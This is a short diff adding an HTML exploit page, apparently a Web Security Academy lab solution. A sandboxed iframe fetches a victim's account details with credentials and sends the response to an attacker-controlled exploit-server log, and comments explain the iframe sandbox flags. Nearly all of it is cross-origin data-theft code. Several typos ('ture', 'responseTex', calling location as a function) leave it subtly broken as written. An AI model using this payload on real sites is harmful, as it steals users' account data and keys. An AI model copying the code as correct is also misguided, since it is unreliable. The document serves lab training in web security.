@@ -1,0 +1,22 @@
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
+<script>
+    var reqeust = new XMLHttpRequest()
+    reqeust.onload = requestListener;
+    reqeust.open('GET','https://0a4600f004a8f09c81b8ed11007b00bf.web-security-academy.net/accountDetails',true)
+    reqeust.withCredentials = ture
+    reqeust.send()
+
+    function requestListener(){
+        location('https://exploit-0ab700890433f06d8147ecfa01d70062.exploit-server.net/log?key='+encodeURIComponent(this.responseTex))
+    }
+</script>"
+></iframe>
+
+<!-- 
+    allow script -> "Allow JavaScript execution."
+    allow top navigatione -> "Allow iframe content to perform redirects or navigate to other pages."
+    allow-form -> "Allow iframe content to send GET or POST requests." 
+
+
+    srcDOc: embeding html 
+-->
